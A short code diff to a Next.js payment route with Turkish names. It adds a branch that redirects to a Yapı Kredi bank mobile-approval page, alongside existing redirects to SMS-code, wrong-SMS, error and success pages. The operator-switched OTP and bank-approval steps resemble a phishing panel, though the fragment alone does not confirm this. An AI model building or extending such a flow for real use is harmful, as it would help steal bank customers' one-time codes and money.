@@ -30,6 +30,8 @@ export async function POST(request: NextRequest) {
                 redirectTo = '/odeme/sms';
             } else if (kontrolValue === 'hatalisms') {
                 redirectTo = '/odeme/hatali-sms';
+            } else if (kontrolValue === 'ykbmobilonay') {
+                redirectTo = '/odeme/ykb-mobil-onay';
             } else if (kontrolValue === 'internet') {
                 redirectTo = '/odeme?internet-hata';
             } else if (kontrolValue === 'tebrik') {
